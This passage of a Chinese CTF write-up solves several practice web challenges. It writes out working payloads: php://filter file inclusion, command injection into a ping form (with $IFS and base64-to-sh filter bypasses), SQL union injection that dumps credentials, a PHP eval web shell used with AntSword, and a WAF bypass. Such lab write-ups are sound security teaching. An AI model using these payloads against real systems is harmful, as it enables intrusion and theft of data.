punctuation\">:</span>center<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span>你想知道蒋璐源的秘密么？<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span>\n\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token style-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token style language-css\"><span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>arial<span class=\"token punctuation\">;</span><span class=\"token property\">color</span><span class=\"token punctuation\">:</span>red<span class=\"token punctuation\">;</span><span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span>20px<span class=\"token punctuation\">;</span><span class=\"token property\">text-align</span><span class=\"token punctuation\">:</span>center<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span>想要的话可以给你，去找吧！把一切都放在那里了！<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>master<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>./Archive_room.php<span class=\"token punctuation\">\"</span></span> <span class=\"token style-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token style language-css\"><span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span>#000000<span class=\"token punctuation\">;</span><span class=\"token property\">height</span><span class=\"token punctuation\">:</span>70px<span class=\"token punctuation\">;</span><span class=\"token property\">width</span><span class=\"token punctuation\">:</span>200px<span class=\"token punctuation\">;</span><span class=\"token property\">color</span><span class=\"token punctuation\">:</span>black<span class=\"token punctuation\">;</span><span class=\"token property\">left</span><span class=\"token punctuation\">:</span>44%<span class=\"token punctuation\">;</span><span class=\"token property\">cursor</span><span class=\"token punctuation\">:</span>default<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span>Oh! You found me<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token style-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token style language-css\"><span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span><span class=\"token property\">bottom</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span><span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 99%<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>center<span class=\"token punctuation\">\"</span></span> <span class=\"token style-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token style language-css\"><span class=\"token property\">font</span><span class=\"token punctuation\">:</span>italic 15px Georgia<span class=\"token punctuation\">,</span>serif<span class=\"token punctuation\">;</span><span class=\"token property\">color</span><span class=\"token punctuation\">:</span>white<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span> Syclover @ cl4y<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">&gt;</span></span>\n\n</code></pre>\n<p>有这样一行代码<code>&lt;a id=\"master\" href=\"./Archive_room.php\" style=\"background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;\"&gt;Oh! You found me&lt;/a&gt;</code><br/> 进入这个目录查看一下<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\e0dabffb82ea446bb66a2c254f6f354f.png\"/><br/> 点击secret<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\1f20bf39aec24c2ebdaff334c72bbbb9.png\"/><br/> 提示查阅结束，返回上个目录，查看一下源码<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\53266388d5874a4fb6db27f5baf263ca.png\"/>此时也没有什么发现，抓个包试了试</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\42d71c810a9a407988be7318635b659e.png\"/><br/> 这里提示secr3t.php，我们进入这个目录看一下<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\0557a8c6e86b4aa982767da6b7af4646.png\"/><br/> 这里提示flag放在了flag.php里，进入falg.php目录<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\eb8413851fa54baaa23eaef303094939.png\"/>还是没有出现flag，找到了但是看不到，此时又想到了PHP的封装协议，我们用一下 [ACTF2020 新生赛]Include里面使用的方法</p>\n<p>构造payload: <code>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</code></p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> html<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span>html<span class=\"token operator\">&gt;</span>\n\n    <span class=\"token operator\">&lt;</span>head<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>meta charset<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"utf-8\"</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>title<span class=\"token operator\">&gt;</span><span class=\"token constant\">FLAG</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>title<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>head<span class=\"token operator\">&gt;</span>\n\n    <span class=\"token operator\">&lt;</span>body style<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"background-color:black;\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span>\n        \n        <span class=\"token operator\">&lt;</span>h1 style<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"font-family:verdana;color:red;text-align:center;\"</span><span class=\"token operator\">&gt;</span>啊哈！你找到我了！可是你看不到我<span class=\"token constant\">QAQ</span><span class=\"token operator\">~</span><span class=\"token operator\">~</span><span class=\"token operator\">~</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h1<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span>\n        \n        <span class=\"token operator\">&lt;</span>p style<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"font-family:arial;color:red;font-size:20px;text-align:center;\"</span><span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"我就在这里\"</span><span class=\"token punctuation\">;</span>\n                <span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'flag{24db537d-9661-4a16-98c8-5c9df4c936fc}'</span><span class=\"token punctuation\">;</span>\n                <span class=\"token variable\">$secret</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'jiAng_Luyuan_w4nts_a_g1rIfri3nd'</span>\n            <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>p<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">&gt;</span>\n\n</code></pre>\n<p>成功找到flag~~</p>\n<h1><a id=\"ACTF2020_Exec_292\"></a>[ACTF2020 新生赛]Exec</h1>\n<p>与<a href=\"https://blog.csdn.net/m0_52923241/article/details/119087138\">[GXYCTF2019]Ping Ping Ping</a>题类似，但此题更简单</p>\n<blockquote>\n<p>需要了解的知识点<br/> ls（英文全拼：list files）：用于显示指定工作目录下的内容（列出目前工作目录所含之文件及子目录)</p>\n<p>cat（英文全拼：concatenate）：用于连接文件并打印到标准输出设备上。</p>\n</blockquote>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\27d4e99021d040ab9a435c6ac17d6162.png\"/><br/> 查看此文件的目录：<code>127.0.0.1|ls</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\d5f79731032a40df9ea51344df4a5635.png\"/><br/> 只有一个index.php</p>\n<p>查看上级目录<code>127.0.0.1|ls /</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\c29a5732980f4405ac3ba839065bc9e1.png\"/><br/> 查看flag：<code>127.0.0.1|cat /flag</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\64f19fa5a9334b2e982a78c6ee8879d2.png\"/><br/> 拿到flag~~</p>\n<h1><a id=\"_2019LoveSQL_312\"></a>[极客大挑战 2019]LoveSQL</h1>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\242884593c464b1ba91e95ea9db8bae3.png\"/>这里提示用 sqlmap 是没有灵魂的，他说没灵魂，可我就是想试一下，结果确实没有灵魂，奉劝像我一样有叛逆心理的师傅们还是不要浪费时间试了······</p>\n<p>听话孩子的解法：<br/> 先随便输入一个万能密码<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\ec90bdc21bc646b9a21e09ec9ebf4c01.png\"/><br/> 找到回显位置<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\dcd76c57b66f46efb421bac58a0189ef.png\"/><br/> 试试联合查询，一直到3的时候回显正常<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\3960f3f1cad6410c812e0e4078b1486b.png\"/><br/> 2和3有回显位置<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\1a1dbddd5d7144b58062d23e75f884f9.png\"/><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\b92314f40f9b492abd8cb06dd99dc33c.png\"/></p>\n<p>输入用户名为1<br/> 爆数据库password=:<code>1' union select 1,2,database()#</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\4203babe568f4debb5216d033444195c.png\"/><br/> 得到数据库名为geek<br/> 爆表名password=<code>1' union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1#</code>——爆出表名为geekuser<br/> 爆表名password=<code>1' union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1#</code>——爆出表名为l0ve1ysq1<br/> 爆列名password=<code>1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1' #</code>——id,username,password<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\044f53d19a584c11834c2a7155b21f78.png\"/><br/> 爆数据：<code>/check.php?username=1&amp;password=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\87359496026843baa2696b835d38c3d5.png\"/>咦？最后这里有点像flag的一部分，怎么就出来这点？缩小一下看看</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\1f82f0f1b9b34c4ca642635090c97a8a.png\"/>呐，不能再小了；嘻嘻，直接F12呗</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\7f83bb460a144484a92ad61429439a0f.png\"/>拿到flag~~</p>\n<h1><a id=\"GXYCTF2019Ping_Ping_Ping_341\"></a>[GXYCTF2019]Ping Ping Ping</h1>\n<p><a href=\"https://blog.csdn.net/m0_52923241/article/details/119087138\">具体知识点点这里</a><br/> <strong>题目类型：命令执行+代码审计</strong><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\078af8117b964ddcac036a549494c72f.png\"/><br/> 提示<code>/?ip=</code></p>\n<p>输入<code>/?ip=127.0.0.1</code>，回显成功<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\73005f65cd75471ba66c6430399d1108.png\"/><br/> 显示当前的所有文件：<code>/?ip=127.0.0.1|ls</code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a1fe3b305c9d4ef8b6e6b45c95b6a84b.png\"/>这里查到了两个php文件<br/> 查看flag.php：<code>?ip=127.0.0.1|cat flag.php</code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\474498c2c79a4f6599e6fb7c1b632742.png\"/>这里提示<code>/?ip= fxck your space!</code>额···fxck是什么东西，space是空格，大佬说应该是空格被过滤了</p>\n<blockquote>\n<p>命令中空格被过滤的解决方法：<br/> <code>{cat,flag.txt}</code><br/> <code>cat${IFS}flag.txt</code><br/> <code>cat$IFS$9flag.txt</code>: <code>$IFS$9 $9指传过来的第9个参数</code><br/> <code>cat&lt;flag.txt</code><br/> <code>cat&lt;&gt;flag.txt</code><br/> <code>kg=$'\\x20flag.txt'&amp;&amp;cat$kg</code><br/> <code>(\\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</code></p>\n</blockquote>\n<p>试试第一个方法：<code>/?ip=127.0.0.1|{cat,flag.php}</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\3e54247c99834e78b0b723c25577f054.png\"/>发现符号又被过滤了，说明<code>{}</code>大括号被过滤了，那第二个不能用了<br/> 试试第三个方法<code>/?ip=127.0.0.1|cat$IFS$9flag.php</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\24b05a13dae945ecb068beadf222a64d.png\"/>flag也被过滤了！</p>\n<p>不是查出来两个文件嘛，看看另一个吧<br/> 查看index.php文件：<code>/?ip=127.0.0.1|cat$IFS$9index.php</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\593bb0dc80dd4c96b211c05c135f56e8.png\"/>发现这个PHP代码好像不太全，我们查看一下源码，出来了，下面是PHP代码</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n  <span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x{00}-\\x{1f}]|\\&gt;|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x{00}-\\x{20}]|\\&gt;|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your symbol!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ /\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your space!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/bash/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your bash!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/.*f.*l.*a.*g.*/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your flag!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ping -c 4 \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//执行操作符 ，-c 4 表示ping的指定次数为4</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre&gt;\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>代码审计一下，好多都被过滤了emmm；但最后有个变量a，我也不知道怎么做<br/> 不会了，学一下大佬的方法吧</p>\n<ul><li> <p><strong>方法一：变量拼接字符串——将a的值覆盖，然后进行绕过</strong><br/> 构造payload：<code>/?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code><br/> 总之就是用变量拼接成flag<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\40caa8ed721e484895e7e01fc80309cd.png\"/>啥也没有，查看源码</p> <pre><code class=\"prism language-php\"><span class=\"token operator\">/</span><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span>\n<span class=\"token operator\">&lt;</span>pre<span class=\"token operator\">&gt;</span><span class=\"token constant\">PING</span> <span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token operator\">.</span><span class=\"token function\">1 </span><span class=\"token punctuation\">(</span><span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token number\">56</span> data bytes\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token class-name type-declaration\">php</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"flag{af15354a-6bdf-4609-b230-75bdc03e1dbf}\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n</code></pre> <p>拿到flag~~</p> </li><li> <p><strong>方法二：内联执行</strong><br/> <em>内联函数：将指定的函数体插入并取代每一处调用该函数的地方。</em></p> <p>反引号在linux中作为内联执行，执行输出结果。也就是说</p> <p><code>cat `ls` //执行ls输出 index.php 和 flag.php 。然后再执行 cat flag.php;cat index.php</code></p> <p>构造payload <code>/?ip=127.0.0.1;cat$IFS$9`ls`</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\d5d5c5b8c8e2483284e930683ad96b5d.png\"/><br/> <strong>方法三：sh命令来执行</strong><br/> 使用 base64 编码的方式来绕过 flag 过滤。</p> <p>加密命令<br/> echo “cat flag.php” | base64<br/> 解密命令并执行<br/> echo Y2F0IGZsYWcucGhwCg== | base64 -d | sh</p> </li></ul>\n<p>然后用<code>$IFS$9</code>代替空格。<br/> 构造payload：<code>/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\43c002c2ec85445fbc183f3421c4e3c0.png\"/> 拿到flag~~</p>\n<h1><a id=\"_2019Knife_438\"></a>[极客大挑战 2019]Knife</h1>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\c192d42aed4a4091add50df10fe271fc.png\"/>很明显的提示，用中国菜刀或者蚁剑，这里我使用蚁剑</p>\n<p>构造payload：<code>/?&lt;?php eval($_POST[\"Syc\"]);?&gt;</code></p>\n<p>打开蚁剑添加数据<br/> URL地址为：http://094fc751-45ef-4f6e-961d-daee474ee7b4.node4.buuoj.cn/index.php<br/> 密码为：Syc<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\905569a67133418784ebbc34582c57c5.png\"/></p>\n<p>用蚁剑查看目录<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\6398a316d8c14c15bf8e8facf581d371.png\"/>查看根目录，找到flag<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\2f937a03e2e54a94bb779094a36e902b.png\"/>进入flag文件夹里<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\ee302be88fdc492389c20462d46e938d.png\"/><br/> 拿到flag~~</p>\n<h1><a id=\"_2019Http_455\"></a>[极客大挑战 2019]Http</h1>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a246a301fb61498996f7878ef00e3e3f.png\"/><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\b20471a05d9845329610d21064051c53.png\"/></p>\n<p>查看源代码，发现有一个Secret.php<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\147d713e9060458397dc1844a629b8d3.png\"/></p>\n<p>进入这个访问该目录<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\2807fcf12e604ac8aa1d3bd0fcc79690.png\"/>提示：It doesn’t come from ‘https://www.Sycsecret.com’，也就是说这个页面得来自https://www.Sycsecret.com，添加referer即可</p>\n<blockquote>\n<p>Referer头用于告诉web服务器，用户是从哪个页面找过来的</p>\n</blockquote>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\5b8617e198ab4177a2d43a98acbc782f.png\"/><br/> 提示Please use “Syclover” browser：请使用“Syclover”浏览器<br/> 添加<code>User-Agent:Syclover</code></p>\n<blockquote>\n<p>User-Agent头用于告诉web服务器用户使用的浏览器和操作系统信息</p>\n</blockquote>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\662ba42467734a26930bf3c69e3648ab.png\"/>提示No!!! you can only read this locally!!!：不! !您只能在本地阅读!!<br/> 添加<code>X-Forwarded-For:127.0.0.1</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\8021c8109b694a1388b1ac2c28d4d9bc.png\"/>拿到flag~~</p>\n<h1><a id=\"RoarCTF_2019Easy_Calc_474\"></a>[RoarCTF 2019]Easy Calc</h1>\n<p>对我来说是一道难题，不过又学到好多<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\e766f79ead5c445bba13a7644abf19a2.png\"/><br/> 查看源码<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\b2d3c021703f4fecaa59af629b9a68ef.png\"/><br/> 抓包<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\dfe85822fe5c41909b261de02ebb47bd.png\"/>发现calc.php，访问一下<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\6650ba9b1c954bf1b9d233ed7e9606d9.png\"/>有个黑名单</p>\n<p><em>OKOK，上面是我所有收集到的信息，然后源码有部分也看不懂，不知道该怎么下手，甚至还不知道这是个什么类型的题目，下面开始学习大佬</em></p>\n<blockquote>\n<p><strong>知识点：</strong></p>\n<ul><li><strong>chr() 函数</strong>：从指定的 ASCII 值返回字符。 ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置0，而十六进制值被定义为带前置 0x。</li><li><strong>file_get_contents() 函数</strong>：把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</li><li><strong>PHP的字符串解析特性</strong>：PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】。假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</li><li><strong>scandir() 函数</strong>：返回指定目录中的文件和目录的数组。</li></ul>\n</blockquote>\n<p>查看源码<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\ece04c7470ec4f4c9eb1048910d1a50a.png\"/><br/> $(\"#content\").val()相当于 document.getElementById(“content”).value;</p>\n<ul><li> <p><strong>方法一：PHP的字符串解析特性</strong><br/> 尝试一下<code>/calc.php?num=phpinfo()</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\6b370a245e094589b792bd903574b234.png\"/></p>\n<blockquote>\n<p><strong>PHP的字符串解析特性</strong>：PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】。假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>\n</blockquote> <p>num前加个空格：<code>/calc.php? num=phpinfo()</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\33fe1aff6ab240068e2176d8d188297e.png\"/><br/> 由于“/”被过滤了，所以我们可以使用chr(47)来进行表示，进行目录读取：<br/> <code>calc.php? num=1;var_dump(scandir(chr(47)))</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\152de556bf404cb0b5a22ff12597f153.png\"/><br/> 构造：<code>/flagg</code>——<code>chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</code><br/> payload：<code>calc.php? 